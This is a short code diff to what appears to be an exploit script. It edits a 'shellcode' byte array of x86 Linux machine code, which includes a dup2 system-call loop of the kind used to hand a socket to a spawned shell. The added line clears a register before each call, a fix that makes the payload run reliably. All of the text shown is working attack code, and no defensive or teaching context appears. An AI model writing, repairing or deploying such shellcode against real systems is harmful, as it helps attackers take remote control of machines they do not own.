@@ -78,6 +78,7 @@ shellcode = bytearray("\x31\xdb"  # xor ebx, ebx
                       "\x93"                  # xchg bx, eax
                       "\x89\xd1"              # mov ecx, edx
                       "\xb1\x02"              # mov cl, 0x02
+                      "\x31\xc0"              # xor eax, eax
                       "\xb0\x3f"              # mov al, 0x3f
                       "\xcd\x80"              # int 0x80
                       "\x49"                  # dec ecx
